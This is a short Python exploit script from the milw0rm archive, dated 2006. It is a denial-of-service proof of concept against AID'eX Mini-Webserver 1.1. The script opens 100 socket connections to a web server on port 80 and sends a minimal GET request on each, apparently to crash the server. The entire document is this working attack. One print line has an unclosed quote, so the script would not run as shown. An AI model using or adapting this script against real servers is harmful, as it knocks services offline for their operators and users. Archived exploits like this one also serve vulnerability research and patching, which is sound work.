import socket

print "---------------------------------------------------------------------"
print "# AID'eX Mini-Webserver Verion 1.1 early Release 3 Denial of Service"
print "# url: http://www.aidex.de/software/webserver/"
print "# author: shinnai"
print "# mail: shinnai[at]autistici[dot]org"
print "# site: http://shinnai.altervista.org"
print "# soundtrack: "Suzanne" (Leonard Cohen)
print "---------------------------------------------------------------------"

host = "127.0.0.1"
port = 80

for i in range (0,100):
   connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   connection.connect((host, port))
   connection.send("GET / HTTP/1.0 \n\n")

# milw0rm.com [2006-12-28]
